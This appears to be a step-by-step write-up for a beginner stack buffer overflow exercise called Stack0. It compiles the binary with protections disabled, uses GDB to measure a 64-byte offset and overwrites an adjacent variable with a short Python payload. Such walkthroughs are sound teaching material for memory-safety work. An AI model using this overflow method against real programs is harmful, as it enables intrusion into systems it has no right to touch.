# Explaination

1. **Compile**

```bash
gcc -m32 -std=gnu89 -fno-stack-protector -g -z execstack -no-pie Stack0.c -o Stack0
```

2. **Drop into GDB and locate vulnerable read**
```bash
gdb ./Stack0

(gdb) disassemble main
```
![Breakpoint](images/BreakPointGets.png)

- Scan for call to `gets`/`strcpy`/`fgets` (whichever unsafe function used).
- Note its address, say `0x080491a6`.


3. **Break at that instruction**
```gdb
(gdb) break *0x080491a6
```

4. **Run a large dummy payload**
```gdb
#directly from GDB
(gdb) run < <(python3 -c "print('A'*200)")
```

5. **When it stops print the addresses**
```gdb
(gdb) print &buffer        # start of buffer
(gdb) print &modified      # or &return_addr slot
```
![Disas](images/GDBdisas.png)

This gives you the number of filler bytes you need to reach `target` (whether it’s a local var or saved RIP/EIP).

6. **Compute exact byte distance**
```gdb
(gdb) print (char*)&modified - (char*)&buffer #will find exact offset
64
```
![Offset](images/OffsetStack0.png)

7. **Craft payload and execute**

```bash
python3 -c 'print("A"*64 + "B")' | ./Stack0
```
![Success](images/Success.png)
